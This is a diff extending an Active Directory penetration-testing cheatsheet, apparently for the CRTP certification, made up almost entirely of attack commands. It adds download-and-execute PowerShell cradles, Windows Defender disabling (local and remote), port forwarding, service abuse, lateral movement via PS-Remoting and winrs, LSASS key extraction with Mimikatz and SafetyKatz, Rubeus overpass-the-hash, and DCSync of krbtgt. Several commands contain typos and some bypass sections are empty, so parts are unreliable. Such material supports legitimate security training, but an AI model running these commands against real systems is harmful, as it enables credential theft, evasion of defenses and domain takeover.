@@ -1,5 +1,37 @@
 # CRTP Cheatsheet
 
+# Misc But Important
+### Powershell Download and Execute Cradles
+```
+iex (New-Object Net.WebClient).DownloadString('http://ip/file')
+```
+```
+iex (iwr 'http://ip/file')
+```
+### Bypassing/Disabling Windows Defender
+```
+Set-MpPreference -DisableRealTimeMonitoring $true
+```
+```
+Set-MpPreference -DisableIOAVProtection $true
+```
+## ScriptBlock Logging Bypassing 
+```
+```
+## AMSI Bypass
+```
+```
+## Dot Net AMSI Bypass for BloodHound
+```
+```
+## Port Forwarding
+```
+netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=machineip
+```
+## AppLocker Policies Enumeration
+```
+Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+```
 # Domain Enumeration
 
 #### PowerView Script 
@@ -211,6 +243,79 @@ SharpHound.exe --stealth
 ```
 Invoke-BloodHound -ExcludeDCs
 ```
+
+# Privilege Escalation
+#### Unquoted Service Path 
+```
+Invoke-AllChecks
+```
+```
+Invoke-ServiceAbuse -Name 'ServiceName' -UserName 'name'
+```
+
+# Lateral Movement 
+### PS-Remoting
+```
+$sess = New-Session -ComputerName name
+Enter-PSSession $sess
+```
+### A Small Check
+```
+Invoke-Command -ScriptBlock {$env:username;$env:computername} -ComputerName name
+```
+#### Execute Commands or ScriptBlock 
+```
+Inovke-Command -ScriptBlock {Command} -ComputerName name
+```
+#### Executing Locally Loaded Function
+```
+Invoke-Command -ScriptBlock ${function:functiontobeexecuted} -ComputerName name
+```
+#### Disabling Windows Defender Remotely
+```
+Invoke-Command -ScriptBlock {Set-MpPreference -DisableRealTimeMonitoring $true} -ComputerName name
+```
+```
+Invoke-Command -ScriptBlock {Set-MpPreference -DisableIOAVProtection $true} -ComputerName name
+```
+### Winrs
+```
+winrs -r:computername cmd
+```
+```
+winrs -r:computername cmd /c "set username && set computername"
+```
+### Extracting Hashes from LSASS
+#### Invoke-Mimikatz
+```
+Invoke-Mimikatz -Command '"sekurlsa::ekeys:'
+```
+#### SafetyKatz 
+```
+SafetyKatz.exe "sekurlsa::ekeys"
+```
+### Over Pass The Hash (OPTH)
+#### Rubeus 
+```
+Rubeus.exe -args %Pwn% /user:username /aes256:hash /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+```
+#### SafetyKatz
+```
+SafetKatz.exe "sekurlsa::opassth /user: /aes256: /domain: /run:cmd.exe" "exit"
+```
+### DCSync
+#### Invoke-MimiKatz 
+```
+Invoke-MimiKatz -Command '"lsadump::dcsync /user:domain\krbtgt"'
+```
+#### SafetyKatz
+```
+SafetyKatz.exe "lsadump::dcsync /user:domain\krbtgt"
+```
+
+# Persistence
+
+
 
 
 
